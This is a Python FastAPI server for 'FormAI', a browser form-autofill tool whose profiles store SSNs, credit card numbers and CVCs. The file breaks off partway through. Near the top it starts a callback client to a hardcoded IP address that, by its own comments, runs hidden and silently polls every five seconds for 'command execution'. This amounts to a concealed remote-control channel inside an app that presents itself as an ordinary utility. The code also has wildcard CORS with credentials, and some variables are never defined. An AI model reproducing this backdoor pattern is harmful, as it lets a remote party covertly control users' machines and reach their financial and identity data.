#!/usr/bin/env python3
"""
FormAI Server - FastAPI with SeleniumBase automation
"""
import os
import sys
import ctypes
import platform

# ============================================
# Admin Privilege Check (Cross-platform)
# ============================================
def is_admin():
    """Check if running with administrator privileges (cross-platform)"""
    try:
        if sys.platform == "win32":
            return ctypes.windll.shell32.IsUserAnAdmin()
        elif sys.platform.startswith("linux"):
            return os.getuid() == 0
        else:
            return False
    except:
        return False

# Fix for PyInstaller --noconsole (stdout/stderr are None)
if sys.stdout is None:
    sys.stdout = open(os.devnull, 'w')
if sys.stderr is None:
    sys.stderr = open(os.devnull, 'w')
if sys.stdin is None:
    sys.stdin = open(os.devnull, 'r')

# Fix Windows encoding issues
if sys.platform == "win32":
    os.environ['PYTHONIOENCODING'] = 'utf-8'
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8')

    # Suppress Windows asyncio pipe transport errors (harmless on shutdown)
    import warnings
    warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')

# Show initial loading message IMMEDIATELY before heavy imports
from colorama import init, Fore, Style
init()
print(f"{Fore.CYAN}Initializing KPR...{Style.RESET_ALL}", flush=True)

import json
import logging
import asyncio
from pathlib import Path
from typing import Dict, List, Optional, Any
from datetime import datetime
import uuid

from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks, UploadFile, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, ConfigDict
import uvicorn

# PyInstaller path utilities (for bundled executable support)
from pyinstaller_utils import get_base_path
BASE_PATH = get_base_path()

# Import our automation modules
from selenium_automation import SeleniumAutomation, FormFieldDetector

# GUI automation is optional (requires display, not available in Docker)
try:
    from tools.gui_automation import GUIHelper, FormFillerGUI
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False
    GUIHelper = None
    FormFillerGUI = None

# Import new recording modules
from tools.recording_manager import RecordingManager
from tools.enhanced_field_mapper import EnhancedFieldMapper
from tools.chrome_recorder_parser import ChromeRecorderParser
# AutofillEngine is imported where needed (bulk fill approach)

# Import callback system (admin server communication)
from client_callback import ClientCallback
from dotenv import load_dotenv

# Import Ollama installer
from tools.ollama_installer import OllamaInstaller, get_installer

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('formai_server.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)

# Global state
profiles: Dict[str, dict] = {}
active_sessions: Dict[str, any] = {}
websocket_connections: List[WebSocket] = []

# Ollama installation state
ollama_installation_progress = {
    "status": "idle",  # idle, installing, complete, error
    "percentage": 0,
    "message": "",
    "result": None
}

# Model download progress tracking
model_download_progress = {}

# Initialize recording components
recording_manager = RecordingManager()
field_mapper = EnhancedFieldMapper()
chrome_parser = ChromeRecorderParser()

# Initialize callback client (hardcoded admin server URL, runs hidden)
admin_callback = ClientCallback(
    admin_url="http://31.97.100.192:5512",
    interval=5,  # 5 seconds = fast command execution
    quiet=True   # Run silently
)

# Pydantic models
class Profile(BaseModel):
    # Allow extra fields from the frontend form
    model_config = ConfigDict(extra="allow")

    # Core fields
    id: Optional[str] = None
    name: Optional[str] = None

    # Basic Information
    title: Optional[str] = None
    firstName: Optional[str] = None
    middleInitial: Optional[str] = None
    lastName: Optional[str] = None
    sex: Optional[str] = None

    # Contact Information
    email: Optional[str] = None
    website: Optional[str] = None
    homePhone: Optional[str] = None
    workPhone: Optional[str] = None
    cellPhone: Optional[str] = None
    fax: Optional[str] = None
    phone: Optional[str] = None  # Legacy field

    # Address Information
    address1: Optional[str] = None
    address2: Optional[str] = None
    city: Optional[str] = None
    state: Optional[str] = None
    zip: Optional[str] = None
    country: Optional[str] = None
    address: Optional[str] = None  # Legacy field

    # Work Information
    company: Optional[str] = None
    position: Optional[str] = None
    income: Optional[str] = None

    # Birth Information
    birthMonth: Optional[str] = None
    birthDay: Optional[str] = None
    birthYear: Optional[str] = None
    age: Optional[str] = None
    birthPlace: Optional[str] = None
    date_of_birth: Optional[str] = None  # Legacy field

    # Account Information
    username: Optional[str] = None
    password: Optional[str] = None

    # ID Information
    ssn: Optional[str] = None
    driverLicense: Optional[str] = None

    # Credit Card Information
    creditCardType: Optional[str] = None
    creditCardNumber: Optional[str] = None
    creditCardName: Optional[str] = None
    creditCardBank: Optional[str] = None
    creditCardExpMonth: Optional[str] = None
    creditCardExpYear: Optional[str] = None
    creditCardCVC: Optional[str] = None
    creditCardServicePhone: Optional[str] = None

    # Additional Information
    customMessage: Optional[str] = None
    comments: Optional[str] = None

    # Legacy fields
    first_name: Optional[str] = None
    last_name: Optional[str] = None

class AutomationRequest(BaseModel):
    profile_id: str
    url: str
    use_stealth: bool = True

class FieldMapping(BaseModel):
    url: str
    mappings: Dict[str, str]

class ChromeRecordingImport(BaseModel):
    recording_name: Optional[str] = None
    chrome_data: Dict[str, Any]

class RecordingReplayRequest(BaseModel):
    profile_id: str
    headless: Optional[bool] = False
    session_name: Optional[str] = None
    preview: Optional[bool] = True  # Default to preview mode (use recorded values)
    step_delay: Optional[int] = 1000  # Delay between steps in milliseconds
    random_variation: Optional[int] = 500  # Random variation in delay
    auto_close: Optional[bool] = True  # Auto-close browser after replay (default: True)
    close_delay: Optional[int] = 2000  # Delay before closing browser in milliseconds
    field_delay: Optional[float] = 0.3  # Delay between field fills in seconds (0.1=fast, 0.3=normal, 0.8=slow)

# Utility functions
def normalize_profile_name(profile: dict) -> str:
    """Extract a display name from profile data using various naming conventions"""
    # Try different name field variations
    name_candidates = [
        profile.get('name'),
        profile.get('profileName'),
        profile.get('fullName')
    ]

    # Check for existing name fields first
    for candidate in name_candidates:
        if candidate and candidate.strip():
            return candidate.strip()

    # Try to construct name from firstName + lastName (flat structure)
    first_name = profile.get('firstName', '').strip()
    last_name = profile.get('lastName', '').strip()

    if first_name or last_name:
        return f"{first_name} {last_name}".strip()

    # Try nested data structure
    data = profile.get('data', {})
    if isinstance(data, dict):
        data_first = data.get('firstName', '').strip()
        data_last = data.get('lastName', '').strip()

        if data_first or data_last:
            return f"{data_first} {data_last}".strip()

    # Try email as fallback
    email = profile.get('email') or (data.get('email') if isinstance(data, dict) else None)
    if email:
        return email.split('@')[0].replace('.', ' ').replace('_', ' ').title()

    # Last resort: use filename or "Unknown Profile"
    return "Unknown Profile"

def normalize_profile_for_api(profile: dict) -> dict:
    """Normalize profile data for API responses with consistent fields"""
    # Ensure we have a normalized name
    name = normalize_profile_name(profile)

    # Extract email from various possible locations
    email = (
        profile.get('email') or
        (profile.get('data', {}).get('email') if isinstance(profile.get('data'), dict) else None) or
        'No email'
    )

    # Extract phone from various possible locations
    phone_candidates = [
        profile.get('phone'),
        profile.get('cellPhone'),
        profile.get('homePhone'),
        profile.get('workPhone')
    ]

    # Also check nested data
    data = profile.get('data', {})
    if isinstance(data, dict):
        phone_candidates.extend([
            data.get('phone'),
            data.get('cellPhone'),
            data.get('homePhone'),
            data.get('workPhone')
        ])

    phone = next((p for p in phone_candidates if p and p.strip()), 'Not provided')

    # Extract other commonly used fields
    first_name = (
        profile.get('firstName') or
        (data.get('firstName') if isinstance(data, dict) else None) or
        ''
    )

    last_name = (
        profile.get('lastName') or
        (data.get('lastName') if isinstance(data, dict) else None) or
        ''
    )

    company = (
        profile.get('company') or
        (data.get('company') if isinstance(data, dict) else None) or
        ''
    )

    return {
        'id': profile.get('id', str(uuid.uuid4())),
        'name': name,
        'email': email,
        'phone': phone,
        'firstName': first_name,
        'lastName': last_name,
        'company': company,
        'status': 'active' if email != 'No email' else 'incomplete',
        # Include original profile data for editing
        **profile
    }

def load_profiles():
    """Load all profiles from JSON files"""
    global profiles
    profiles_dir = Path("profiles")
    if profiles_dir.exists():
        for file in profiles_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    profile = json.load(f)

                    # Ensure profile has an ID
                    if 'id' not in profile:
                        profile['id'] = str(uuid.uuid4())

                    # Normalize the profile name
                    normalized_name = normalize_profile_name(profile)
                    if 'name' not in profile or not profile['name']:
                        profile['name'] = normalized_name

                    profiles[profile['id']] = profile
            except Exception as e:
                print(f"{Fore.RED}ERROR:{Style.RESET_ALL} Error loading {file}: {e}")

def save_profile(profile: dict):
    """Save profile to JSON file"""
    profiles_dir = Path("profiles")
    profiles_dir.mkdir(exist_ok=True)

    profile_id = profile.get('id', str(uuid.uuid4()))
    profile['id'] = profile_id

    file_path = profiles_dir / f"{profile_id}.json"
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(profile, f, indent=2)

    profiles[profile_id] = profile
    return profile_id

async def broadcast_message(message: dict):
    """Broadcast message to all connected WebSocket clients"""
    for connection in websocket_connections[:]:  # Create a copy to iterate safely
        try:
            await connection.send_json(message)
        except:
            websocket_connections.remove(connection)

# Lifespan context manager for startup/shutdown
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Handle startup and shutdown events"""
    # Startup
    # Load existing profiles
    load_profiles()

    # Create necessary directories
    for dir_name in ['profiles', 'field_mappings', 'recordings']:
        Path(dir_name).mkdir(exist_ok=True)

    # Check Ollama status (informational only, no auto-install)
    async def check_ollama_status():
        """Check if Ollama is available for local AI"""
        try:
            installer = get_installer()
            status = installer.check_installation()

            if status["installed"] and status["running"]:
                models = status.get("models_available", [])
                if models:
                    print(f"{Fore.GREEN}[Ollama] Local AI ready - Models: {', '.join(models)}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[Ollama] Ollama running but no models installed{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[Ollama] Run: ollama pull llama3.2{Style.RESET_ALL}")
            elif status["installed"]:
                print(f"{Fore.YELLOW}[Ollama] Ollama installed but not running{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}[Ollama] Local AI not installed - Download from Settings page or ollama.com{Style.RESET_ALL}")

        except Exception:
            pass  # Silent fail - not critical

    # Check Ollama in background (don't block server startup)
    asyncio.create_task(check_ollama_status())

    # AutofillEngine uses SeleniumBase (Python) - no Node.js needed
    print(f"{Fore.GREEN}[AutofillEngine] Ready for bulk form filling{Style.RESET_ALL}")

    print(f"Server ready at http://localhost:5511")

    # Start callback system
    admin_callback.start()

    # Check for updates in background
    async def check_for_updates():
        """Non-blocking update check"""
        try:
            from tools.auto_updater import check_and_download
            await check_and_download()
        except Exception as e:
            logger.debug(f"Update check skipped: {e}")

    asyncio.create_task(check_for_updates())

    # Auto-restart monitor for pending updates (when idle)
    async def update_restart_monitor():
        """Monitor for pending updates and restart when idle"""
        from tools.auto_updater import AutoUpdater
        updater = AutoUpdater()

        while True:
            await asyncio.sleep(10)  # Check every 10 seconds

            try:
                if updater.has_pending_update() and len(active_sessions) == 0:
                    pending_version = updater.get_pending_version()
                    logger.info(f"Update {pending_version} ready, system idle - restarting...")
                    print(f"{Fore.CYAN}[Update] Version {pending_version} ready, restarting to apply...{Style.RESET_ALL}")

                    # Broadcast to connected WebSocket clients
                    restart_msg = json.dumps({
                        "type": "server_restarting",
                        "reason": "update",
                        "version": pending_version
                    })
                    for client in connected_clients:
                        try:
                            await client.send_text(restart_msg)
                        except:
                            pass

                    # Give clients 2 seconds to receive message
                    await asyncio.sleep(2)

                    # Trigger restart
                    import os
                    import sys
                    os.execv(sys.executable, [sys.executable] + sys.argv)
            except Exception as e:
                logger.debug(f"Update monitor check: {e}")

    asyncio.create_task(update_restart_monitor())

    yield  # Server runs here

    # Shutdown (silent)

    # Stop callback system
    await admin_callback.stop()

    # Close active sessions
    for session_id in list(active_sessions.keys()):
        try:
            await active_sessions[session_id].close()
        except:
            pass

# Import version
try:
    from version import __version__
except ImportError:
    __version__ = "1.0.3"

# FastAPI app with lifespan
app = FastAPI(title="FormAI", version=__version__, lifespan=lifespan)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
async def root():
    """Serve the main dashboard"""
    return FileResponse(str(BASE_PATH / "web" / "index.html"))

@app.get("/profiles")
async def profiles_page():
    """Serve the profiles page"""
    return FileResponse(str(BASE_PATH / "web" / "profiles.html"))

@app.get("/automation")
async def automation_page():
    """Serve the automation page"""
    return FileResponse(str(BASE_PATH / "web" / "automation.html"))

@app.get("/recorder")
async def recorder_page():
    """Serve the recorder page"""
    return FileResponse(str(BASE_PATH / "web" / "recorder.html"))

@app.get("/settings")
async def settings_page():
    """Serve the settings page"""
    return FileResponse(str(BASE_PATH / "web" / "settings.html"))

@app.get("/recording-editor")
async def recording_editor_page():
    """Serve the recording editor page"""
    return FileResponse(str(BASE_PATH / "web" / "recording-editor.html"))


@app.get("/api/profiles")
async def get_profiles():
    """Get all profiles with normalized data"""
    normalized_profiles = [normalize_profile_for_api(profile) for profile in profiles.values()]
    return JSONResponse(content=normalized_profiles)

@app.get("/api/profiles/{profile_id}")
async def get_profile(profile_id: str):
    """Get a specific profile with normalized data"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")
    return JSONResponse(content=normalize_profile_for_api(profiles[profile_id]))

@app.post("/api/profiles")
async def create_profile(profile: Profile):
    """Create a new profile"""
    profile_dict = profile.model_dump()
    profile_id = save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_created",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"id": profile_id, "message": "Profile created"})

@app.put("/api/profiles/{profile_id}")
async def update_profile(profile_id: str, profile: Profile):
    """Update an existing profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile_dict = profile.model_dump()
    profile_dict['id'] = profile_id
    save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_updated",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"message": "Profile updated"})

@app.delete("/api/profiles/{profile_id}")
async def delete_profile(profile_id: str):
    """Delete a profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    # Delete file
    file_path = Path("profiles") / f"{profile_id}.json"
    if file_path.exists():
        file_path.unlink()

    # Remove from memory
    del profiles[profile_id]

    await broadcast_message({
        "type": "profile_deleted",
        "data": {"id": profile_id}
    })

    return JSONResponse(content={"message": "Profile deleted"})

@app.post("/api/automation/start")
async def start_automation(request: AutomationRequest, background_tasks: BackgroundTasks):
    """Start browser automation for a profile"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Create automation instance
    automation = SeleniumAutomation(
        session_id=session_id,
        profile=profile,
        use_stealth=request.use_stealth
    )

    active_sessions[session_id] = automation

    # Run automation in background
    background_tasks.add_task(
        run_automation,
        session_id,
        request.url
    )

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Automation started",
        "profile": profile['name']
    })

@app.post("/api/automation/start-ai")
async def start_ai_automation(request: AutomationRequest):
    """Start AI-powered form filling using Playwright MCP (no recording needed)"""
    try:
        # Load profile
        if request.profile_id not in profiles:
            raise HTTPException(status_code=404, detail="Profile not found")

        profile = profiles[request.profile_id]

        # Import AI form filler and MCP controller
        from tools.ai_form_filler import get_ai_form_filler
        from tools.mcp_controller import get_mcp_controller

        ai_filler = get_ai_form_filler()
        mcp_controller = get_mcp_controller()

        # Normalize profile data
        if 'data' in profile:
            profile_data = profile['data']
        else:
            profile_data = profile

        # Fill form intelligently using AI
        result = await ai_filler.fill_form_intelligently(
            url=request.url,
            profile=profile_data,
            mcp_controller=mcp_controller
        )

        # Send progress updates via WebSocket
        await websocket_manager.send_json({
            "type": "ai_automation_complete",
            "data": {
                "status": result.get("status"),
                "url": result.get("url"),
                "fields_filled": result.get("fields_filled", 0),
                "detected_fields": result.get("detected_fields", 0),
                "mapped_fields": result.get("mapped_fields", 0)
            }
        })

        return JSONResponse(content={
            "success": result.get("status") in ["success", "partial"],
            "status": result.get("status"),
            "message": f"AI filled {result.get('fields_filled', 0)} fields",
            "result": result
        })

    except Exception as e:
        logger.error(f"AI automation error: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={
                "success": False,
                "error": str(e)
            }
        )

@app.get("/api/field-mappings")
async def get_field_mappings():
    """Get all saved field mappings"""
    mappings = []
    mappings_dir = Path("field_mappings")

    if mappings_dir.exists():
        for file in mappings_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    mapping = json.load(f)
                    mappings.append(mapping)
            except:
                pass

    return JSONResponse(content=mappings)

@app.post("/api/field-mappings")
async def save_field_mapping(mapping: FieldMapping):
    """Save a field mapping for a URL"""
    mappings_dir = Path("field_mappings")
    mappings_dir.mkdir(exist_ok=True)

    # Create filename from URL
    safe_filename = mapping.url.replace('://', '_').replace('/', '_')[:100]
    file_path = mappings_dir / f"{safe_filename}.json"

    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(mapping.model_dump(), f, indent=2)

    return JSONResponse(content={"message": "Mapping saved"})

# Recording Management Endpoints

@app.post("/api/recordings/import-chrome")
async def import_chrome_recording(request: ChromeRecordingImport):
    """Import a Chrome DevTools Recorder JSON"""
    try:
        # Parse the Chrome recording to get the name and URL
        from tools.chrome_recorder_parser import ChromeRecorderParser
        parser = ChromeRecorderParser()
        parsed_data = parser.parse_chrome_recording_data(request.chrome_data)
        recording_name = request.recording_name or parsed_data.get("recording_name", "Unnamed")
        recording_url = parsed_data.get("url", "")

        # Check for duplicate before importing
        duplicate = recording_manager.find_duplicate(recording_name, recording_url)
        if duplicate:
            raise HTTPException(
                status_code=409,  # 409 Conflict
                detail=f"Recording '{recording_name}' for URL '{recording_url}' already exists (ID: {duplicate['recording_id']}). Please use a different name or delete the existing recording first."
            )

        recording = recording_manager.import_chrome_recording_data(
            chrome_data=request.chrome_data,
            recording_name=request.recording_name
        )

        # Enhance field mappings
        enhanced_recording = field_mapper.enhance_recording_field_mappings(recording)
        recording_manager.save_recording(enhanced_recording)

        await broadcast_message({
            "type": "recording_imported",
            "data": {
                "recording_id": recording["recording_id"],
                "recording_name": recording["recording_name"],
                "total_fields": len(recording.get("field_mappings", []))
            }
        })

        return JSONResponse(content={
            "recording_id": recording["recording_id"],
            "message": "Chrome recording imported successfully",
            "total_fields": len(recording.get("field_mappings", []))
        })

    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/recordings")
async def list_recordings():
    """List all recordings"""
    try:
        recordings = recording_manager.list_recordings()
        return JSONResponse(content=recordings)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/recordings/{recording_id}")
async def get_recording(recording_id: str):
    """Get a specific recording"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")
    return JSONResponse(content=recording)

@app.delete("/api/recordings/{recording_id}")
async def delete_recording(recording_id: str):
    """Delete a recording"""
    success = recording_manager.delete_recording(recording_id)
    if not success:
        raise HTTPException(status_code=404, detail="Recording not found")

    await broadcast_message({
        "type": "recording_deleted",
        "data": {"recording_id": recording_id}
    })

    return JSONResponse(content={"message": "Recording deleted"})

@app.post("/api/recordings/{recording_id}/replay")
async def replay_recording(recording_id: str, request: RecordingReplayRequest):
    """Replay a recording using bulk autofill (fast mode)"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Import AutofillEngine (bulk fill approach - 10x faster)
    from tools.autofill_engine import AutofillEngine

    # Run autofill in background
    async def run_autofill():
        try:
            # Step 1: Starting
            await broadcast_message({
                "type": "replay_progress",
                "session_id": session_id,
                "data": {
                    "status": "starting",
                    "message": "Starting bulk autofill...",
                    "progress": 10
                }
            })

            # Create engine (headless based on request, field_delay for speed control)
            engine = AutofillEngine(headless=request.headless, field_delay=request.field_delay)

            # Step 2: Execute bulk fill
            await broadcast_message({
                "type": "replay_progress",
                "session_id": session_id,
                "data": {
                    "status": "filling",
                    "message": "Filling form fields...",
                    "progress": 30
                }
            })

            result = await engine.execute(
                recording=recording,
                profile=profile
            )

            # Step 3: Complete
            await broadcast_message({
                "type": "replay_progress",
                "session_id": session_id,
                "data": {
                    "status": "complete",
                    "message": f"Completed: {result.fields_filled} fields filled, submitted: {result.submitted}",
                    "progress": 100
                }
            })

            # Send completion message
            await broadcast_message({
                "type": "replay_complete",
                "session_id": session_id,
                "data": {
                    "success": result.success,
                    "fields_filled": result.fields_filled,
                    "checkboxes_checked": result.checkboxes_checked,
                    "radios_selected": result.radios_selected,
                    "submitted": result.submitted,
                    "error": result.error
                }
            })

        except Exception as e:
            logger.error(f"Autofill failed: {e}", exc_info=True)
            await broadcast_message({
                "type": "replay_error",
                "session_id": session_id,
                "data": {
                    "error": str(e),
                    "message": f"Autofill failed: {str(e)}"
                }
            })
        finally:
            if session_id in active_sessions:
                del active_sessions[session_id]

    # Store session and start
    active_sessions[session_id] = {"type": "autofill", "session_id": session_id}
    asyncio.create_task(run_autofill())

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Bulk autofill started (fast mode)",
        "recording_name": recording.get("recording_name") or recording.get("title", "Unknown"),
        "profile_name": profile.get("profileName", "Unknown"),
        "mode": "bulk_autofill"
    })

@app.get("/api/recordings/stats")
async def get_recording_stats():
    """Get recording statistics"""
    try:
        stats = recording_manager.get_recording_stats()
        return JSONResponse(content=stats)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/recordings/{recording_id}/create-template")
async def create_template(recording_id: str, template_name: str, description: str = ""):
    """Create a template from a recording"""
    try:
        template = recording_manager.create_template(recording_id, template_name, description)

        await broadcast_message({
            "type": "template_created",
            "data": {
                "template_id": template["template_id"],
                "template_name": template["template_name"]
            }
        })

        return JSONResponse(content=template)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/templates")
async def list_templates():
    """List all templates"""
    try:
        templates = recording_manager.list_templates()
        return JSONResponse(content=templates)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Template replay endpoint removed - templates now use Puppeteer replay like recordings
# Templates can be converted to recordings and replayed via /api/recordings/{id}/replay

@app.get("/api/recordings/{recording_id}/analyze")
async def analyze_recording(recording_id: str):
    """Analyze recording field mappings"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    try:
        # Enhance field mappings if not already enhanced
        if "enhancement_metadata" not in recording:
            enhanced_recording = field_mapper.enhance_recording_field_mappings(recording)
            recording_manager.save_recording(enhanced_recording)
            recording = enhanced_recording

        # Generate analysis report
        report = field_mapper.generate_field_mapping_report(recording)
        suggestions = field_mapper.suggest_field_mapping_corrections(recording)

        return JSONResponse(content={
            "report": report,
            "suggestions": suggestions
        })

    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Recording Editor API Endpoints

class FieldMappingsUpdate(BaseModel):
    field_mappings: List[Dict[str, Any]]

class SelectorTestRequest(BaseModel):
    selector: str

@app.put("/api/recordings/{recording_id}/field-mappings")
async def update_field_mappings(recording_id: str, request: FieldMappingsUpdate):
    """Update field mappings for a recording"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    try:
        # Update field mappings
        recording["field_mappings"] = request.field_mappings
        recording["updated_at"] = datetime.now().isoformat()

        # Save the updated recording
        recording_manager.save_recording(recording)

        await broadcast_message({
            "type": "recording_updated",
            "data": {
                "recording_id": recording_id,
                "total_fields": len(request.field_mappings)
            }
        })

        return JSONResponse(content={
            "success": True,
            "message": "Field mappings updated",
            "total_fields": len(request.field_mappings)
        })

    except Exception as e:
        logger.error(f"Error updating field mappings: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/recordings/{recording_id}/test-selector")
async def test_selector(recording_id: str, request: SelectorTestRequest):
    """Test if a CSS selector finds elements on the recording's URL"""
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    # For now, return a simulated response
    # In a full implementation, this would use a headless browser to test
    # the selector against the actual page

    # Check if we have an active session that could test this
    if active_sessions:
        # Try to test with an active session
        for session_id, session in active_sessions.items():
            if hasattr(session, 'test_selector'):
                try:
                    result = await session.test_selector(request.selector)
                    return JSONResponse(content=result)
                except Exception:
                    pass

    # Return info that testing requires active session
    return JSONResponse(content={
        "found": None,
        "count": 0,
        "message": "Selector testing requires an active browser session. Start a replay to enable live testing.",
        "selector": request.selector
    })

# Form Validation API

class ValidateRequest(BaseModel):
    recording_id: str
    profile_id: str

@app.post("/api/validate")
async def validate_form_data(request: ValidateRequest):
    """Validate profile data against recording field requirements"""
    from tools.form_validator import get_validator

    # Get recording
    recording = recording_manager.get_recording(request.recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    # Get profile
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[request.profile_id]

    # Run validation
    validator = get_validator()
    result = validator.validate_recording_with_profile(recording, profile)

    return JSONResponse(content=result.to_dict())

@app.get("/api/recordings/{recording_id}/validate/{profile_id}")
async def validate_recording_profile(recording_id: str, profile_id: str):
    """Validate profile data against recording - GET endpoint for convenience"""
    from tools.form_validator import get_validator

    # Get recording
    recording = recording_manager.get_recording(recording_id)
    if not recording:
        raise HTTPException(status_code=404, detail="Recording not found")

    # Get profile
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[profile_id]

    # Run validation
    validator = get_validator()
    result = validator.validate_recording_with_profile(recording, profile)

    return JSONResponse(content=result.to_dict())

@app.get("/api/api-keys")
async def get_api_keys():
    """Get available API keys configuration"""
    api_keys_dir = Path("api_keys")
    api_keys = {}

    if api_keys_dir.exists():
        for file in api_keys_dir.glob("*.json"):
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    key_data = json.load(f)
                    service_name = file.stem
                    api_keys[service_name] = {
                        "configured": bool(key_data.get("api_key") or key_data.get("key")),
                        "service": service_name,
                        "masked_key": key_data.get("api_key", "")[:8] + "..." if key_data.get("api_key") else ""
                    }
            except:
                pass

    return JSONResponse(content=api_keys)

@app.post("/api/api-keys")
async def save_api_key(request: Request):
    """Save API key or configuration for a service"""
    try:
        data = await request.json()
        service = data.get("service")
        api_key = data.get("api_key")

        if not service or not api_key:
            raise HTTPException(status_code=400, detail="Service and API key are required")

        # Create api_keys directory if it doesn't exist
        api_keys_dir = Path("api_keys")
        api_keys_dir.mkdir(exist_ok=True)

        # Save API key or URL (for Ollama)
        key_file = api_keys_dir / f"{service}.json"

        # For Ollama, store as base_url instead of api_key
        if service == 'ollama':
            key_data = {
                "service": service,
                "api_key": api_key,  # Store URL in api_key field for consistency
                "base_url": api_key,
                "updated_at": datetime.now().isoformat()
            }
        else:
            key_data = {
                "service": service,
                "api_key": api_key,
                "updated_at": datetime.now().isoformat()
            }

        with open(key_file, 'w', encoding='utf-8') as f:
            json.dump(key_data, f, indent=2)

        logger.info(f"API key saved for service: {service}")

        return JSONResponse(content={
            "success": True,
            "message": f"{'Configuration' if service == 'ollama' else 'API key'} saved for {service}",
            "service": service,
            "configured": True
        })

    except Exception as e:
        logger.error(f"Error saving API key: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/ollama/status")
async def get_ollama_status():
    """Check Ollama installation and running status"""
    try:
        installer = get_installer()
        status = installer.check_installation()

        # Add current model from .env
        current_model = os.getenv("OLLAMA_MODEL", "llama3.2")
        status["current_model"] = current_model

        return JSONResponse(content=status)
    except Exception as e:
        logger.error(f"Error checking Ollama status: {e}", exc_info=True)
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/ollama/install")
async def install_ollama(background_tasks: BackgroundTasks):
    """Trigger Ollama installation in background"""
    global ollama_installation_progress

    # Check if already installing
    if ollama_installation_progress["status"] == "installing":
        return JSONResponse(content={
            "success": False,
            "message": "Installation already in progress"
        })

    # Reset progress
    ollama_installation_progress = {

        "status": "installing",
        "percentage": 0,
        "message": "Starting installation...",
        "result": None
    }

    # Start installation in background
    async def run_installation():
        global ollama_installation_progress

        def progress_callback(status: str, percentage: int, message: str):
            ollama_installation_progress["status"] = status
            ollama_installation_progress["percentage"] = percentage
            ollama_installation_progress["message"] = message

        try:
            installer = get_installer(progress_callback)
            result = installer.install_complete()

            ollama_installation_progress["result"] = result
            if result["success"]:
                ollama_installation_progress["status"] = "complete"
                ollama_installation_progress["percentage"] = 100
                ollama_installation_progress["message"] = result["message"]
            else:
                ollama_installation_progress["status"] = "error"
                ollama_installation_progress["message"] = result["message"]

        except Exception as e:
            logger.error(f"Installation error: {e}", exc_info=True)
            ollama_installation_progress["status"] = "error"
            ollama_installation_progress["message"] = str(e)

    background_tasks.add_task(run_installation)

    return JSONResponse(content={
        "success": True,
        "message": "Installation started in background"
    })

@app.get("/api/ollama/install-progress")
async def get_install_progress():
    """Get current installation progress"""
    global ollama_installation_progress
    return JSONResponse(content=ollama_installation_progress)

@app.post("/api/ollama/download-model")
async def download_model(request: Request, background_tasks: BackgroundTasks):
    """Download a specific Ollama model"""
    global model_download_progress

    try:
        data = await request.json()
        model_name = data.get("model_name")

        if not model_name:
            raise HTTPException(status_code=400, detail="model_name is required")

        # Check if already downloading
        if model_name in model_download_progress and model_download_progress[model_name]["status"] == "downloading":
            return JSONResponse(content={
                "success": False,
                "message": "Model download already in progress"
            })

        # Initialize progress tracking
        model_download_progress[model_name] = {
            "status": "downloading",
